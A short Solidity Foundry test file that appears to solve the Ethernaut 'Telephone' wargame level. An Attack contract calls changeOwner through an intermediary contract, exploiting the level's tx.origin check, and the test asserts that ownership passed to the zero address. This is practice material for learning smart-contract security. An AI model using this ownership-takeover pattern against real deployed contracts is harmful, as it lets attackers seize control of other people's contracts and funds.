// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Telephone} from "../../src/ethernaut/Telephone.sol";

contract Attack{

    function ack(Telephone telephone) public {
        telephone.changeOwner(0x0000000000000000000000000000000000000000);
    }
}

contract TelephoneTest is Test {
    Telephone public telephone;
    Attack public attack;
    function setUp() public {
        telephone = new Telephone();
        attack = new Attack();
    }

    function test_on() public{
        attack.ack(telephone);
        console.log("owner:",telephone.owner());
        assertEq(telephone.owner(), 0x0000000000000000000000000000000000000000);
    }

    
}